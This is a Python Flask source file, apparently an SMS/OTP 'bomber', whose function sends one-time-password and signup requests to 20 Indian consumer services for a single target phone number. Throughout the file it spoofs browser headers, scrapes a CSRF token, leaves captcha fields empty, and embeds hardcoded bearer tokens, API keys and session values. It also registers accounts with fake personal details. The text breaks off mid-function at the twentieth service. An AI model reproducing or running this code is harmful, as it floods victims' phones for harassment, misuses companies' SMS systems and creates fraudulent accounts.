from flask import Flask, request, jsonify
import requests
import re
import json
from urllib.parse import urlencode

app = Flask(__name__)

def send_otp(number):
    # Ensure number starts with +91
    if not number.startswith("+"):
        number = "+91" + number

    results = []
    
    # --- API 1: Hoichoi ---
    try:
        url1 = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
        headers1 = {
            "accept": "*/*",
            "accept-language": "en-IN,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.hoichoi.tv",
            "referer": "https://www.hoichoi.tv/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
        }
        payload1 = {"phoneNumber": number}
        r1 = requests.post(url1, headers=headers1, json=payload1, timeout=10)
        results.append({"service": "Hoichoi", "status": r1.status_code, "response": r1.text})
    except Exception as e:
        results.append({"service": "Hoichoi", "status": "Error", "response": str(e)})

    # --- API 2: ShemarooMe ---
    try:
        url2 = "https://www.shemaroome.com/users/mobile_no_signup"
        headers2 = {
            "authority": "www.shemaroome.com",
            "accept": "*/*",
            "accept-language": "en-IN,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.shemaroome.com",
            "referer": "https://www.shemaroome.com/users/sign_in",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data2 = {"mobile_no": number, "registration_source": "organic"}
        r2 = requests.post(url2, headers=headers2, data=data2, timeout=10)
        results.append({"service": "ShemarooMe", "status": r2.status_code, "response": r2.text})
    except Exception as e:
        results.append({"service": "ShemarooMe", "status": "Error", "response": str(e)})

    # --- API 3: Hathway ---
    try:
        session = requests.Session()
        homepage_url = "https://www.hathway.com/Home/NewConnection"
        home = session.get(homepage_url, timeout=10)
        match = re.search(r'name="csrf-token" content="(.*?)"', home.text)
        if not match:
            results.append({"service": "Hathway", "status": "Error", "response": "CSRF token not found"})
        else:
            csrf_token = match.group(1)
            headers3 = {
                'authority': 'www.hathway.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.hathway.com',
                'referer': homepage_url,
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-csrf-token': csrf_token,
                'x-requested-with': 'XMLHttpRequest',
            }
            data3 = {'c_contact': number.replace("+91", "")}
            r3 = session.post("https://www.hathway.com/api/sendOtp", headers=headers3, data=data3, timeout=10)
            results.append({"service": "Hathway", "status": r3.status_code, "response": r3.text})
    except Exception as e:
        results.append({"service": "Hathway", "status": "Error", "response": str(e)})

    # --- API 4: Licious ---
    try:
        url4 = "https://www.licious.in/api/login/signup"
        headers4 = {
            "accept": "*/*",
            "accept-language": "en-IN,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.licious.in",
            "referer": "https://www.licious.in/profile",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        }
        json_data = {"phone": number.replace("+91", ""), "captcha_token": ""}
        r4 = requests.post(url4, headers=headers4, json=json_data, timeout=10)
        results.append({"service": "Licious", "status": r4.status_code, "response": r4.text})
    except Exception as e:
        results.append({"service": "Licious", "status": "Error", "response": str(e)})

    # --- API 5: Box8 ---
    try:
        url5 = "https://accounts.box8.co.in/customers/sign_up"
        headers5 = {
            'authority': 'accounts.box8.co.in',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'authorization': 'Bearer eyJraWQiOiIxZWQ1ZDFiNjI5NDY0MmFlOWEyZGU2NDQzZWZlZmI2Y2I8OTRkMjAwNjU0NGUzYzljOWE3N2JkM2UwYzkyNThhIiwiYWxnIjoiUlMyNTYifQ.eyJpYXQiOjE3NTcwODU4MjcsImV4cCI6MTc1NzIwNTAwMCwic3NpZCI6IjRiNzg3NWMxLTE4MzctNDg3MS05MmI4LTFmN2RmMDc5NzUzYzE3NTcwODU4MjciLCJhY2Nfd3lwZSI6IkFub255bW91c0FjY291bnQiLCJwbGF0Zm9ybSI6IndlYiIsImRldmljZV9pZCI6ImFqdHU2ZnhhLWhhY2stOXQ4ei14enB2LXBoeXA0czdzZTd1OSIsImJyYW5kX2lkIjoxLCJhdWQiOiJjdXN0b21lciIsImlzcyI6ImFjY291bnRzLmJveDguY28uaW4ifQ.Zycdly8bvjNtJGk2UKH-vxcMc8JS11pNhGV9mJff0BgN7lkSgBqWds95-dsrvlQ3fBw3Fzf0nwojxbqra1OBK9ATL5g8f3AI2iEZk0bhI2wNivt1tJ8hLMxWu3wK5TTHtDsoj6MYh85pVXgH00TNYMARUyOQFNuqeMBLpWIqASBe-6CJlSosTqvcu1XMvBr7Ie1nPBL4ZDR3ZIbLAp6HQ-PVxKKrhdEn_lzOk0NqCow2SZZbG7BSn8E16nDTW6YvEi2-HFYdbWgcY-vDiQUhl-nves4RRz9LiAvr6X3ZYed7CteGa4X4LSGlmf5jl1KHM7NwEeoZwbYDVVIaFQc5xPNVKCFvdFhU9rDfO-G_ytz8lbqA3qMnLp56Vcp38eACzKAKVN3my946kGOQiOV80lxuswUIb32ZXAG6GiKbT-REau76CGHwm0wjqWRmNVNhedUPWAo-Mv86-PB4yLVksedNJK5Q5Sgm0VVra_TWNcZkwKqtYIzSM15pLTbOgEeUkRRBQjmyyLw7o_j8BjdYTSo5RjyeTbYG9AjzLz7dfJPVybwuel5cLggtnET4jWzPlm42fJj3aeqcjhsdKMKS3yhvV65zrzGYLsMc4xqsGIW1b2ZBPcFC1z6zWG1tX0ENOQnR2E_gAG6OThbkhIeRf5Y58yBgfFFSZTbT4hfrqwM',
            'content-type': 'application/json',
            'origin': 'https://box8.in',
            'referer': 'https://box8.in/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        params5 = {'origin': 'box8', 'platform': 'web'}
        json_data5 = {
            'phone_no': number.replace("+91", ""),
            'name': 'Karatos',
            'email': 'lustion@gmail.com',
            'password': 'karatospy@',
        }
        r5 = requests.post(url5, params=params5, headers=headers5, json=json_data5, timeout=10)
        results.append({"service": "Box8", "status": r5.status_code, "response": r5.text})
    except Exception as e:
        results.append({"service": "Box8", "status": "Error", "response": str(e)})
        
    # --- API 6: LazyPay ---
    try:
        headers6 = {
            'authority': 'api.lazypay.in',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'context': 'dashboard',
            'fingerprintid': '3419544578',
            'origin': 'https://lazypay.in',
            'referer': 'https://lazypay.in/',
            'sec-ch-ua': '"Chromium";v"137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'tab-identifier': '1JDHapypRVqPeWaTReSa9Y0o',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        json_data6 = {
            'username': number.replace("+91", ""),
        }
        r6 = requests.post('https://api.lazypay.in/api/lazypay/v0/userportal/sendOtp', 
                          headers=headers6, json=json_data6, timeout=10)
        results.append({"service": "LazyPay", "status": r6.status_code, "response": r6.text})
    except Exception as e:
        results.append({"service": "LazyPay", "status": "Error", "response": str(e)})
        
    # --- API 7: KreditBee ---
    try:
        headers7 = {
            'authority': 'api.kreditbee.in',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'authorization': 'Bearer null',
            'content-type': 'application/json',
            'origin': 'https://pwa-web1.kreditbee.in',
            'referer': 'https://pwa-web1.kreditbee.in/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-kb-info': 'eyJsYXQiOiIwIiwibG5nIjoiMCIsImRpZCI6IiIsImFwcHR5cGUiOiJ3ZWIiLCJhcHB2ZXIiOiIiLCJpc3Ryb3RlZCI6IiJ9',
        }
        json_data7 = {
            'reason': 'loginOrRegister',
            'mobile': number.replace("+91", ""),
            'appsflyerId': '650acda6-5926-435b-bb5c-e7114b6ac279-p',
            'mediaSource': '',
            'firebaseInstanceId': '',
            'firebaseiosAppInstId': '',
        }
        r7 = requests.put('https://api.kreditbee.in/v1/me/otp', headers=headers7, json=json_data7, timeout=10)
        results.append({"service": "KreditBee", "status": r7.status_code, "response": r7.text})
    except Exception as e:
        results.append({"service": "KreditBee", "status": "Error", "response": str(e)})
        
    # --- API 8: GoPaySense ---
    try:
        headers8 = {
            'Accept': '*/*',
            'Accept-Language': 'en-IN,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://www.gopaysense.com',
            'Referer': 'https://www.gopaysense.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Acept': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        json_data8 = {
            'phone': number.replace("+91", ""),
        }
        r8 = requests.post('https://api.gopaysense.com/users/otp', 
                          headers=headers8, json=json_data8, timeout=10)
        results.append({"service": "GoPaySense", "status": r8.status_code, "response": r8.text})
    except Exception as e:
        results.append({"service": "GoPaySense", "status": "Error", "response": str(e)})
        
    # --- API 9: Hotstar ---
    try:
        headers9 = {
            'authority': 'www.hotstar.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'eng',
            'content-type': 'application/json',
            'origin': 'https://www.hotstar.com',
            'referer': 'https://www.hotstar.com/in/onboarding?ref=%2Fin%2Fhome',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-country-code': 'in',
            'x-hs-accept-language': 'eng',
            'x-hs-app': '250825000',
            'x-hs-client': 'platform:mweb;app_version:25.08.25.0;browser:Chrome;schema_version:0.0.1556;os:Android;os_version:10;browser_version:137;network_data:4g',
            'x-hs-client-targeting': 'ad_id:23a701-3923cb-83c11d-6b809e;user_lat:false;',
            'x-hs-device-id': '23a701-3923cb-83c11d-6b809e',
            'x-hs-is-retry': 'false',
            'x-hs-platform': 'mweb',
            'x-hs-request-id': '97ac5-e89e-376608-61d01e',
            'x-hs-retry-count': '0',
            'x-request-id': '97ac5-e89e-376608-61d01e',
        }
        params9 = {
            'action': 'userRegistration',
        }
        json_data9 = {
            'body': {
                '@type': 'type.googleapis.com/feature.login.InitiatePhoneLoginRequest',
                'initiate_by': 0,
                'recaptcha_token': '',
                'phone_number': number.replace("+91", ""),
            },
        }
        r9 = requests.post(
            'https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8',
            params=params9,
            headers=headers9,
            json=json_data9,
            timeout=10
        )
        results.append({"service": "Hotstar", "status": r9.status_code, "response": r9.text})
    except Exception as e:
        results.append({"service": "Hotstar", "status": "Error", "response": str(e)})
        
    # --- API 10: ZEE5 ---
    try:
        headers10 = {
            'authority': 'auth.zee5.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'device_id': 'f04615b2-b062-4e89-b241-32980ef1cc64',
            'esk': 'ZjA0NjE1Yj2YjA2Mi00ZTg5LWIyNDEtMzI5ODBlZjFjYzY0X19nQlFhWkxpTmRHTjlVc0NLWmFsb2doejl0OVN0V0xTRF9fMTc1NzEwMTIwNjE2Mw==',
            'origin': 'https://www.zee5.com',
            'referer': 'https://www.zee5.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-z5-guest-token': 'f04615b2-b062-4e89-b241-32980ef1cc64',
        }
        json_data10 = {
            'phoneno': '91' + number.replace("+91", ""),
        }
        r10 = requests.post('https://auth.zee5.com/v1/user/sendotp', 
                           headers=headers10, json=json_data10, timeout=10)
        results.append({"service": "ZEE5", "status": r10.status_code, "response": r10.text})
    except Exception as e:
        results.append({"service": "ZEE5", "status": "Error", "response": str(e)})
        
    # --- API 11: Apna ---
    try:
        headers11 = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://employer.apna.co",
            "referer": "https://employer.apna.co/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "x-firebase-appcheck": "eyJraWQiOiIwMHlhdmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjk3ODQ2Mjg4Mjk5MTp3ZWI6ZGQ4ZThmNzE5NzVkYjQ2YjRiNjg1YSIsImF1ZCI6WyJwcm9qZWN0cy85Nzg0NjI4ODI5OTEiLCJwcm9qZWN0cy9hcG5hdGltZS1mYmM3MiJdLCJwcm92aWRlciI6InJlY2FwdGNoYV92MyIsImlzcyI6Imh0dHBzOi8vZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbS85Nzg0NjI4ODI5OTEiLCJleHAiOjE3NTcxMzY2MTEsImlhdCI6MTc1NzA1MDIxMSwianRpIjoiTlRSUzNmbUxtc2lHamxvc0pRRnhteXlJLUVqS2tscUxoejBCNFJIY3RmcyJ9.jt2hcNM6k-Vj-vcfLRE9RTa5hKjLvUl2rvKaoQRhnqgGTlN6R49zzCw7DwXTtFCRwi-WsjUiv2UrZYn1RDba1Fn3d4KbIGpeJmHAZlTa9TJPfpmbaapl5t7GGRerq1toxu7W9wGE1VoHeZXjPW4eu0cRzgtbRxXRudnrMoLuz_Wxd9pzGG7eBqg58uksWA61YWMSylADaFh-wVt1WoWUDx0E7M5Sfwpbxi7x60HyU_fZkfC9NOIcvvm1C6IEpvPPh8wSBTPc1rHKod-oy2pujlYjCb8IYgW0KTbiwA7gP7XsQg8R0VmjLgsnBrTBDcd00ttP_V7cRQTFLoJ3tKMCH1B6LPO5HmD12GCtnUVoO7MjHVRySODN5cg9r_yJwZaFOSue8FXf0uB8B0PNni63MuBo7ZnGU1DaHwkSLlArWDhkrkbVgfX23d8TJNDOEyqQSitRskEwEXNfFiz53j0RiHg7T10taRA0TtqwnDbGWyRktND6VuN_cKnO4ZUJbjda",
        }
        payload11 = {
            "phone_number": "91" + number.replace("+91", ""),
            "retries": 0,
            "hash_type": "employer",
            "source": "employer",
        }
        r11 = requests.post("https://production.apna.co/api/userprofile/v1/otp/", 
                           headers=headers11, json=payload11, timeout=10)
        results.append({"service": "Apna", "status": r11.status_code, "response": r11.text})
    except Exception as e:
        results.append({"service": "Apna", "status": "Error", "response": str(e)})
        
    # --- API 12: Goibibo ---
    try:
        headers12 = {
            'authority': 'userservice.goibibo.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'authorization': 'h4nhc9jcgpAGIjp',
            'content-type': 'application/json',
            'currency': 'inr',
            'language': 'eng',
            'origin': 'https://www.goibibo.com',
            'referer': 'https://www.goibibo.com/',
            'region': 'in',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'user-identifier': '{"type":"auth","deviceId":"d01e1707-1eae-4237-a8c8-6027e05ce785","os":"pwa","osVersion":"osVersion","appVersion":"appVersion","imie":"imie","ipAddress":"ipAddress","timeZone":"+5.30 GMT","value":"","deviceOrBrowserInfo":"Chrome"}',
            'x-request-tracker': '649456c4-6103-41b9-a59d-28099aaedfa9',
        }
        json_data12 = {
            'loginId': number.replace("+91", ""),
            'countryCode': 91,
            'channel': [
                'MOBILE',
            ],
            'type': 6,
            'appHashKey': '@www.goibibo.com #',
        }
        r12 = requests.post(
            'https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG',
            headers=headers12,
            json=json_data12,
            timeout=10
        )
        results.append({"service": "Goibibo", "status": r12.status_code, "response": r12.text})
    except Exception as e:
        results.append({"service": "Goibibo", "status": "Error", "response": str(e)})
        
    # --- API 13: Lenskart ---
    try:
        headers13 = {
            'authority': 'api-gateway.juno.lenskart.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.lenskart.com',
            'referer': 'https://www.lenskart.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-accept-language': 'en',
            'x-api-client': 'mobilesite',
            'x-b3-traceid': '991757133531310',
            'x-country-code': 'IN',
            'x-country-code-override': 'IN',
            'x-session-token': '542cdf49-0851-40fb-af7f-c921e3e261d4',
        }
        json_data13 = {
            'captcha': None,
            'phoneCode': '+91',
            'telephone': number.replace("+91", ""),
        }
        r13 = requests.post('https://api-gateway.juno.lenskart.com/v3/customers/sendOtp', 
                           headers=headers13, json=json_data13, timeout=10)
        results.append({"service": "Lenskart", "status": r13.status_code, "response": r13.text})
    except Exception as e:
        results.append({"service": "Lenskart", "status": "Error", "response": str(e)})

    # --- API 14: Food Stories ---
    try:
        headers14 = {
            'authority': 'www.foodstories.shop',
            'accept': 'text/x-component',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'text/plain;charset=UTF-8',
            'next-action': '4088dec131e19c1a992694ec851e74e3f778b4ffa1',
            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22(pages)%22%2C%7B%22children%22%3A%5B%22shop%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22%22%2C%22oc%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'origin': 'https://www.foodstories.shop',
            'referer': 'https://www.foodstories.shop/shop/?' + urlencode({
                'utm_source': 'Google',
                'utm_medium': 'CPC_PMax',
                'utm_campaign': 'PMax_AllProducts_16thSept',
                'gad_source': '1',
                'gad_campaignid': '21328373430',
                'gbraid': '0AAAAA9TONpRbYAGmUf35Q-__ixHBbrftd',
                'gclid': 'EAIaIQobChMIjdP4oOy_jwMVifRMAh2b3hSAEAAYASAAEgJnavD_BwE'
            }),
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params14 = {
            'utm_source': 'Google',
            'utm_medium': 'CPC_PMax',
            'utm_campaign': 'PMax_AllProducts_16thSept',
            'gad_source': '1',
            'gad_campaignid': '21328373430',
            'gbraid': '0AAAAA9TONpRbYAGmUf35Q-__ixHBbrftd',
            'gclid': 'EAIaIQobChMIjdP4oOy_jwMVifRMAh2b3hSAEAAYASAAEgJnavD_BwE',
        }
        
        data14 = '[{"mobilenumber":"' + number.replace("+91", "") + '"}]'
        
        r14 = requests.post(
            'https://www.foodstories.shop/shop/',
            params=params14,
            headers=headers14,
            data=data14,
            timeout=10
        )
        results.append({"service": "Food Stories", "status": r14.status_code, "response": r14.text})
    except Exception as e:
        results.append({"service": "Food Stories", "status": "Error", "response": str(e)})

    # --- API 15: Cars24 ---
    try:
        headers15 = {
            'authority': 'pvt-product.cars24.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'origin': 'https://www.cars24.com',
            'phone_number': number.replace("+91", ""),
            'referer': 'https://www.cars24.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-api-key': 'qGuMZcWGxZpgd8uSH4rgkal4v1evAlCd',
            'x_country': '',
        }

        r15 = requests.post(
            'https://pvt-product.cars24.com/pp/auth/mobile/otp/send/',
            headers=headers15,
            json={'mobile': number.replace("+91", "")},
            timeout=10
        )
        results.append({"service": "Cars24", "status": r15.status_code, "response": r15.text})
    except Exception as e:
        results.append({"service": "Cars24", "status": "Error", "response": str(e)})

    # --- API 16: Anthe ---
    try:
        headers16 = {
            "authority": "anthe.aakash.ac.in",
            "accept": "*/*",
            "accept-language": "en-IN,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://anthe.aakash.ac.in",
            "referer": "https://anthe.aakash.ac.in/anthe",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        data16 = {
            "mobileparam": number.replace("+91", ""),
            "global_data_id": "anthe-otp-verify",
            "student_name": "",
            "corpid": ""
        }

        session = requests.Session()
        r16 = session.post('https://anthe.aakash.ac.in/anthe/global-otp-verify', 
                          headers=headers16, data=data16, timeout=10)
        results.append({"service": "Anthe", "status": r16.status_code, "response": r16.text})
    except Exception as e:
        results.append({"service": "Anthe", "status": "Error", "response": str(e)})

    # --- API 17: Eat Anytime ---
    try:
        headers17 = {
            'authority': 'sotp-api.lucentinnovation.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'action': 'sendOTP',
            'content-type': 'application/json',
            'origin': 'https://eatanytime.in',
            'referer': 'https://eatanytime.in/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'shop_name': 'eat-anytime.myshopify.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        json_data17 = {
            'username': number,
            'type': 'mobile',
            'domain': 'eatanytime.in',
        }

        r17 = requests.post(
            'https://sotp-api.lucentinnovation.com/v6/otp',
            headers=headers17,
            json=json_data17,
            timeout=10
        )
        results.append({"service": "Eat Anytime", "status": r17.status_code, "response": r17.text})
    except Exception as e:
        results.append({"service": "Eat Anytime", "status": "Error", "response": str(e)})

    # --- API 18: Pantaloons ---
    try:
        headers18 = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlblBheWxvYWQiOnsiZGV2aWNlSWQiOiJlYTFkZDQ3YS00ZGI5LTRhZmMtYTlmZC1mODJhMzA2Y2Q4ZmIifSwiaWF0IjoxNzU3MDEyNjkzfQ.OKeRLCKBP3jAka6N_YOqi5rK2N8s7EzcHpKLycI-tNU',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'origin': 'https://www.pantaloons.com',
            'referer': 'https://www.pantaloons.com/',
            'securekey': 'SuEFE2fooK9DlsIDAvaICJsxEJr1qjRP',
            'source': 'mobile',
        }

        json_data18 = {
            'brand': 'pantaloons',
            'validateHash': False,
            'utmSource': '-1',
            'version': 3.4,
            'geoLocation': {
                'latitude': 343,
            },
            'deviceType': 'mobile',
            'fcmToken': '111',
            'mobile': number.replace("+91", ""),
            'mode': 'verify',
            'cartId': 0,
            'customerId': 0,
            'sliderSource': '-1',
            'cartOperation': 'add',
            'deviceId': 'ea1dd47a-4db9-4afc-a9fd-f82a306cd8fb',
            'deviceToken': 'cef5f364dcdce7fb722187800f0466ee.1757012693',
            'sessionId': 'cef5f364dcdce7fb722187800f0466ee',
            'hash': 'c9e5eafc4163f586b6ecbdabe7d9a284',
        }

        r18 = requests.post(
            'https://apigateway.pantaloons.com/common/sendOTP',
            headers=headers18,
            json=json_data18,
            timeout=10
        )
        results.append({"service": "Pantaloons", "status": r18.status_code, "response": r18.text})
    except Exception as e:
        results.append({"service": "Pantaloons", "status": "Error", "response": str(e)})

    # --- API 19: Snapdeal ---
    try:
        headers19 = {
            'authority': 'm.snapdeal.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://m.snapdeal.com',
            'referer': 'https://m.snapdeal.com/signin',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        json_data19 = {
            'j_password': None,
            'j_mobilenumber': number.replace("+91", ""),
            'agree': True,
            'j_confpassword': None,
            'journey': 'mobile',
            'numberEdit': False,
            'j_fullname': 'Guest',
            'swp': True,
        }

        r19 = requests.post(
            'https://m.snapdeal.com/signupCompleteAjax',
            headers=headers19,
            json=json_data19,
            timeout=10
        )
        results.append({"service": "Snapdeal", "status": r19.status_code, "response": r19.text})
    except Exception as e:
        results.append({"service": "Snapdeal", "status": "Error", "response": str(e)})

    # --- API 20: PW (Physics Wallah) ---
    try:
        headers20 = {
            'authority': 'api.penpencil.co',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.pw.live',
            'randomid': '494dfb28-1e43-4aa2-bc78-ecc1f99aa1a5',
            'referer': 'https://www.pw.live/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        params20 = {
            'smsType': '0',
        }

        json_data20 = {
            'mobile': number.replace("+91", ""),
            'countryCode': '+91',
            'subOrgId': 'SUB-PWLI000',
        }

        r20 = requests.post(
            'https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',
            params=params20,
            headers=headers20,
            json=json_data20,
            timeout=10
        )
